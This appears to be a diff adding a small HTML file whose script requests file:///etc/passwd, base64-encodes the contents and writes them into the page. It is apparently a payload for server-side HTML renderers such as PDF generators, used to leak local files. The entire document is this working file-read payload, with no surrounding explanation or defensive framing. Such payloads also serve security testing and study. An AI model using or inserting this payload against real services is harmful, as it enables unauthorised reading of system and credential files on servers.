@@ -1,0 +1,19 @@
+<html>
+	<script>
+		function addNewlines(str) {
+			var result = '';
+			while (str.length > 0) {
+				result += str.substring(0, 100) + '\n';
+				str = str.substring(100);
+			}
+			return result;
+		}
+
+		x = new XMLHttpRequest();
+		x.onload = function(){
+			document.write(addNewlines(btoa(this.responseText)))
+		};
+		x.open("GET", "file:///etc/passwd");
+		x.send();
+	</script>
+</html>
